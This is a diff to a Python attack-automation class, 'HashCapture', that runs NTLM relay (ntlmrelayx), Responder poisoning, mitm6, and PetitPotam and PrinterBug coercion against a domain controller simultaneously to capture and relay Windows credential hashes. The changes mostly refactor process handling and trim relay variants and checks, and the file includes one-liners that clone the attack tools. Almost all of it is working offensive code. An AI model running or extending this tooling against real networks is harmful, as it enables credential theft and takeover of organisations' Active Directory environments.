@@ -47,10 +47,7 @@ class HashCapture:
             "responder": logging.getLogger("responder"),
             "mitm6": logging.getLogger("mitm6"),
             "petitpotam": logging.getLogger("petitpotam"),
-            "printerbug": logging.getLogger("printerbug"),
-            "adcs_relay": logging.getLogger("adcs_relay"),
-            "webdav_relay": logging.getLogger("webdav_relay"),
-            "sccm_relay": logging.getLogger("sccm_relay")
+            "printerbug": logging.getLogger("printerbug")
         }
 
         # Configure attack loggers with console output
@@ -81,19 +78,12 @@ class HashCapture:
             "netexec": "pip3 install netexec",
             "nslookup": "apt install dnsutils",
             "petitpotam.py": "mkdir -p /opt/tools && cd /opt/tools && git clone https://github.com/topotam/PetitPotam.git && ln -s /opt/tools/PetitPotam/PetitPotam.py /usr/local/bin/petitpotam.py && chmod +x /usr/local/bin/petitpotam.py",
-            "printerbug.py": "mkdir -p /opt/tools && cd /opt/tools && git clone https://github.com/dirkjanm/krbrelayx.git && ln -s /opt/tools/krbrelayx/printerbug.py /usr/local/bin/printerbug.py && chmod +x /usr/local/bin/printerbug.py",
-            "dfscoerce.py": "mkdir -p /opt/tools && cd /opt/tools && git clone https://github.com/Wh04m1001/DFSCoerce.git && ln -s /opt/tools/DFSCoerce/dfscoerce.py /usr/local/bin/dfscoerce.py && chmod +x /usr/local/bin/dfscoerce.py"
+            "printerbug.py": "mkdir -p /opt/tools && cd /opt/tools && git clone https://github.com/dirkjanm/krbrelayx.git && ln -s /opt/tools/krbrelayx/printerbug.py /usr/local/bin/printerbug.py && chmod +x /usr/local/bin/printerbug.py"
         }
 
         required_modules = [
             'netifaces',
-            'ipaddress',
-            'scapy',
-            'twisted',
-            'impacket',
-            'ldap3',
-            'cryptography',
-            'dsinternals'
+            'ipaddress'
         ]
 
         # Check Python modules
@@ -117,15 +107,6 @@ class HashCapture:
 
         if len(missing_tools) > 0 or len(missing_modules) > 0:
             self.logger.error("Missing dependencies. Please install required tools and modules.")
-            if len(missing_tools) > 0:
-                self.logger.error(f"Missing tools: {', '.join(missing_tools)}")
-            if len(missing_modules) > 0:
-                self.logger.error(f"Missing modules: {', '.join(missing_modules)}")
-            return False
-
-        # Check if running as root
-        if os.geteuid() != 0:
-            self.logger.error("Script must be run as root")
             return False
 
         return True
@@ -159,25 +140,17 @@ class HashCapture:
 
     def process_output(self, process, logger, name):
         """Helper function to process output from attack processes"""
-        while True:
-            line = process.stdout.readline()
-            if not line and process.poll() is not None:
-                break
-            if line:
-                line = line.decode('utf-8').strip()
-                logger.info(f"{name}: {line}")
-
-    def run_attack_thread(self, attack_func):
-        """Run an attack in a separate thread with improved monitoring"""
         try:
-            self.logger.info(f"Starting attack thread: {attack_func.__name__}")
-            while not self.stop_event.is_set():
-                if not attack_func():
-                    self.logger.warning(f"Attack {attack_func.__name__} failed, retrying in 30 seconds")
-                    time.sleep(30)  # Wait before retrying
-                time.sleep(1)
+            while True:
+                line = process.stdout.readline()
+                if not line and process.poll() is not None:
+                    break
+                if line:
+                    # Line is already a string when using universal_newlines=True
+                    line_str = line.strip()
+                    logger.info(f"{name}: {line_str}")
         except Exception as e:
-            self.logger.error(f"Error in attack thread {attack_func.__name__}: {e}")
+            self.logger.error(f"Error processing output for {name}: {e}")
 
     def cleanup(self):
         """Clean up running processes"""
@@ -194,22 +167,8 @@ class HashCapture:
                 except:
                     pass
 
-    def create_targets_file(self):
-        """Create the targets file for ntlmrelayx"""
-        try:
-            with open("targets.txt", "w") as f:
-                f.write(f"{self.local_ip}\n")
-                if self.domain:
-                    dc_ip = self.get_dc_ip()
-                    if dc_ip:
-                        f.write(f"{dc_ip}\n")
-            return True
-        except Exception as e:
-            self.logger.error(f"Failed to create targets file: {e}")
-            return False
-
     def start_ntlmrelay(self):
-        """Start NTLM relay attack with improved output handling"""
+        """Start NTLM relay attack"""
         try:
             cmd = [
                 "ntlmrelayx.py",
@@ -226,12 +185,20 @@ class HashCapture:
                 ])
             
             self.logger.info(f"Starting NTLM relay with command: {' '.join(cmd)}")
-            process = Popen(cmd, stdout=PIPE, stderr=STDOUT, bufsize=1, universal_newlines=True)
+            process = Popen(
+                cmd,
+                stdout=PIPE,
+                stderr=STDOUT,
+                universal_newlines=True,
+                bufsize=1
+            )
             self.processes["ntlmrelay"] = process
             
             # Start output processing in a separate thread
-            output_thread = Thread(target=self.process_output, 
-                                 args=(process, self.attack_loggers["ntlmrelay"], "NTLM Relay"))
+            output_thread = Thread(
+                target=self.process_output,
+                args=(process, self.attack_loggers["ntlmrelay"], "NTLM Relay")
+            )
             output_thread.daemon = True
             output_thread.start()
             
@@ -247,7 +214,7 @@ class HashCapture:
                 "responder",
                 "-I", self.interface,
                 "-wrf",
-                "-v"  # Add verbose flag
+                "-v"
             ]
 
             if self.domain:
@@ -256,12 +223,20 @@ class HashCapture:
                 ])
 
             self.logger.info(f"Starting Responder with command: {' '.join(cmd)}")
-            process = Popen(cmd, stdout=PIPE, stderr=STDOUT, bufsize=1, universal_newlines=True)
+            process = Popen(
+                cmd,
+                stdout=PIPE,
+                stderr=STDOUT,
+                universal_newlines=True,
+                bufsize=1
+            )
             self.processes["responder"] = process
 
             # Start output processing in a separate thread
-            output_thread = Thread(target=self.process_output,
-                                 args=(process, self.attack_loggers["responder"], "Responder"))
+            output_thread = Thread(
+                target=self.process_output,
+                args=(process, self.attack_loggers["responder"], "Responder")
+            )
             output_thread.daemon = True
             output_thread.start()
 
@@ -273,18 +248,26 @@ class HashCapture:
     def start_mitm6(self):
         """Start mitm6 attack"""
         try:
-            cmd = ["mitm6", "-i", self.interface, "-v"]  # Add verbose flag
+            cmd = ["mitm6", "-i", self.interface, "-v"]
             
             if self.domain:
                 cmd.extend(["-d", self.domain])
             
             self.logger.info(f"Starting mitm6 with command: {' '.join(cmd)}")
-            process = Popen(cmd, stdout=PIPE, stderr=STDOUT, bufsize=1, universal_newlines=True)
+            process = Popen(
+                cmd,
+                stdout=PIPE,
+                stderr=STDOUT,
+                universal_newlines=True,
+                bufsize=1
+            )
             self.processes["mitm6"] = process
-
+            
             # Start output processing in a separate thread
-            output_thread = Thread(target=self.process_output,
-                                 args=(process, self.attack_loggers["mitm6"], "MITM6"))
+            output_thread = Thread(
+                target=self.process_output,
+                args=(process, self.attack_loggers["mitm6"], "MITM6")
+            )
             output_thread.daemon = True
             output_thread.start()
             
@@ -304,17 +287,24 @@ class HashCapture:
                 "petitpotam.py",
                 "-d", self.domain,
                 "-u", "anonymous",
-                "-target", self.get_dc_ip(),
-                "-debug"  # Add debug flag if available
+                "-target", self.get_dc_ip()
             ]
             
             self.logger.info(f"Starting PetitPotam with command: {' '.join(cmd)}")
-            process = Popen(cmd, stdout=PIPE, stderr=STDOUT, bufsize=1, universal_newlines=True)
+            process = Popen(
+                cmd,
+                stdout=PIPE,
+                stderr=STDOUT,
+                universal_newlines=True,
+                bufsize=1
+            )
             self.processes["petitpotam"] = process
-
+            
             # Start output processing in a separate thread
-            output_thread = Thread(target=self.process_output,
-                                 args=(process, self.attack_loggers["petitpotam"], "PetitPotam"))
+            output_thread = Thread(
+                target=self.process_output,
+                args=(process, self.attack_loggers["petitpotam"], "PetitPotam")
+            )
             output_thread.daemon = True
             output_thread.start()
             
@@ -338,12 +328,20 @@ class HashCapture:
             ]
             
             self.logger.info(f"Starting PrinterBug with command: {' '.join(cmd)}")
-            process = Popen(cmd, stdout=PIPE, stderr=STDOUT, bufsize=1, universal_newlines=True)
+            process = Popen(
+                cmd,
+                stdout=PIPE,
+                stderr=STDOUT,
+                universal_newlines=True,
+                bufsize=1
+            )
             self.processes["printerbug"] = process
-
+            
             # Start output processing in a separate thread
-            output_thread = Thread(target=self.process_output,
-                                 args=(process, self.attack_loggers["printerbug"], "PrinterBug"))
+            output_thread = Thread(
+                target=self.process_output,
+                args=(process, self.attack_loggers["printerbug"], "PrinterBug")
+            )
             output_thread.daemon = True
             output_thread.start()
             
@@ -352,9 +350,8 @@ class HashCapture:
             self.logger.error(f"Error in start_printerbug: {e}")
             return False
 
-# Part 2 to fix indents
     def run(self):
-        """Main execution flow running all attacks simultaneously with improved monitoring"""
+        """Main execution flow running all attacks simultaneously"""
         self.logger.info("Starting Hash Capture Operation")
         
         # Run dependency checks
@@ -362,12 +359,6 @@ class HashCapture:
         if not self.check_dependencies():
             self.logger.error("Dependency checks failed")
             return False
-        
-        # Create targets file if domain is specified
-        if self.domain:
-            if not self.create_targets_file():
-                self.logger.error("Failed to create targets file")
-                return False
         
         try:
             # List of attacks to run
@@ -379,41 +370,26 @@ class HashCapture:
                 ("PrinterBug", self.start_printerbug)
             ]
 
-            # Tracking failed attacks
-            failed_attacks = []
-
             # Start each attack in its own thread
             for attack_name, attack_func in attacks:
                 try:
                     self.logger.info(f"Launching {attack_name} attack...")
-                    thread = Thread(target=self.run_attack_thread, args=(attack_func,))
+                    thread = Thread(target=attack_func)
                     thread.daemon = True
                     thread.start()
                     self.attack_threads.append(thread)
                     self.logger.info(f"{attack_name} attack thread started successfully")
                 except Exception as e:
                     self.logger.error(f"Failed to start {attack_name} attack: {e}")
-                    failed_attacks.append(attack_name)
 
-            if failed_attacks:
-                self.logger.warning(f"Failed to start the following attacks: {', '.join(failed_attacks)}")
+            self.logger.info("All attacks initiated. Press Ctrl+C to stop...")
 
-            self.logger.info("All attacks initiated. Monitoring for results...")
-
-            # Monitor attack threads and keep main thread alive
-            try:
-                while not self.stop_event.is_set():
-                    # Log active threads every minute
-                    active_threads = [t.name for t in self.attack_threads if t.is_alive()]
-                    self.logger.debug(f"Active attack threads: {', '.join(active_threads) or 'None'}")
-                    time.sleep(60)
-            except KeyboardInterrupt:
-                self.logger.info("Received interrupt signal, shutting down...")
-                self.stop_event.set()
-
-        except Exception as e:
-            self.logger.error(f"Error in main execution: {e}")
-            return False
+            # Keep the main thread alive
+            while not self.stop_event.is_set():
+                time.sleep(1)
+                
+        except KeyboardInterrupt:
+            self.logger.info("Operation interrupted by user")
         finally:
             self.cleanup()
         
